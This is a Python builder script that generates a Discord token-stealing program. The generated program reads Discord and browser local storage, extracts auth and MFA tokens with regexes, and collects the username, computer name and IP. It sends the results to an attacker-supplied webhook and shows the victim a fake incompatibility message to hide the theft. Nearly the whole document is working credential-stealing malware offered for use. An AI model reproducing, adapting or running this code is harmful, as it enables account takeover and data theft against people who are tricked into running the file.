from colored import fg, attr
import time

r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)

def create_grabber():
    webhookUrl = input(f"\n {r2}[{b}?{r2}] Webhook: ")
    fileName = input(f" {r2}[{b}?{r2}] File name: ")

    print(f"\n {r2}[{b}+{r2}] Writing files")
    time.sleep(.3)

    try:
        with open(f"{fileName}.py", "w") as file:
            file.write("""import os
import re
import json

from urllib.request import Request, urlopen

def get_tokens(path):
    tokens = []

    for file in [i for i in os.listdir(path) if i.endswith('.ldb') or i.endswith('.log')]:
        with open(f"{path}\\\\{file}", "r", errors='ignore') as file:
            for line in file.readlines():
                for tkn in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)
                for tkn in re.findall(r'mfa\\.[\\w-]{84}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)

    return tokens

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': f"{roaming}\\\\Discord",
    'Discord Canary': f"{roaming}\\\\discordcanary",
    'Discord PTB': f"{roaming}\\\\discordptb",
    'Google Chrome': f"{local}\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    'Opera': f"{roaming}\\\\Opera Software\\\\Opera Stable",
    'Brave': f"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    'Yandex': f"{local}\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default",
    "Brave" : f"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\",
    "Vivaldi" : f"{local}\\\\Vivaldi\\\\User Data\\\\Default\\\\"
}

grabbedTokens = {}

for key, val in paths.items():
    if os.path.exists(f"{val}\\\\Local Storage\\\\leveldb"):
        grab = get_tokens(f"{val}\\\\Local Storage\\\\leveldb")
        if len(grab) != 0:
            grabbedTokens[key] = grab

message = "```ini\\n"

try:
    req = Request("http://httpbin.org/ip")
    ip = json.loads(urlopen(req, timeout = 3).read().decode())["origin"]
except Exception as e:
    ip = "Unable to fetch"

pc_name = os.environ['COMPUTERNAME']
user = os.getenv('username')

message += f"[ User Data ]\\n - Username: {user}\\n - Computer name: {pc_name}\\n - IP: {ip}\\n\\n"

if len(grabbedTokens) == 0:
    message += "[ No tokens found ]"
else:
    for key, val in grabbedTokens.items():
        message += f"[ {key} ]\\n - "
        message += "\\n - ".join(val)
        message += "\\n\\n"
    message += "```"

headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
payload = json.dumps({'content': message})

req = Request(
    "~~TOKENURLHERE~~",
    data=payload.encode(),
    headers=headers
)

urlopen(req)

print("Sorry, your pc is not compatable for this software, please use another.")
input("Please press enter, to exit out of the program.")
""".replace("~~TOKENURLHERE~~", webhookUrl))

    except Exception as e:
        print(f" {r2}[{b}!{r2}] Error writing file: {e}")
    else:
        print(f" {r2}[{b}!{r2}] File written as {fileName}.py")
